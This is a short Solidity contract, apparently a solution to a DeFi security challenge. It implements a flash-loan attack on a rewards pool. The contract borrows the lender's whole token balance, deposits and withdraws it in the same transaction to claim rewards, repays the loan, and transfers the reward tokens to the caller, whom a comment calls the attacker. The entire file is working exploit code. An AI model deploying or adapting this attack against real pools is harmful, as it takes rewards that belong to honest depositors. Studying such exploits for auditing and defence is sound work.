// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
interface IERC20 {
    function transfer(address to, uint256 amount) external returns(bool);
    function transferFrom(address from, address to, uint256 amount) external;
    function balanceOf(address user) external returns(uint);
    function approve(address acc, uint256 amount) external;
}
interface Flashloan {
    function flashLoan(uint256 amount) external;
}

interface Pool {
    function deposit(uint256 amountToDeposit) external;
    function withdraw(uint256 amountToDeposit) external;
}

contract Exploit5 {
    Pool pool;
    Flashloan flashLoaner;
    IERC20 liquidityToken;
    IERC20 rewardsToken;

    function attack(address flashloanAddr, address poolAddr, address _liquidityToken, address _rewardsToken) public {
        // init contracts
        pool = Pool(poolAddr);
        flashLoaner = Flashloan(flashloanAddr);
        liquidityToken = IERC20(_liquidityToken);
        rewardsToken = IERC20(_rewardsToken);

        // max. val of loan
        uint amount = liquidityToken.balanceOf(flashloanAddr);
        liquidityToken.approve(poolAddr, amount);
        flashLoaner.flashLoan(amount);

        // send rewards back to attacker 
        uint balance = rewardsToken.balanceOf(address(this));

        require(balance > 0, "reward balance was 0");
        bool success = rewardsToken.transfer(msg.sender, balance);
        require(success, "transfer fail");
    }


    function receiveFlashLoan(uint256 amount) public {
        // get rewards
        pool.deposit(amount);
        pool.withdraw(amount);

        // repay loan
        liquidityToken.transfer(address(flashLoaner), amount);        
        

    }

}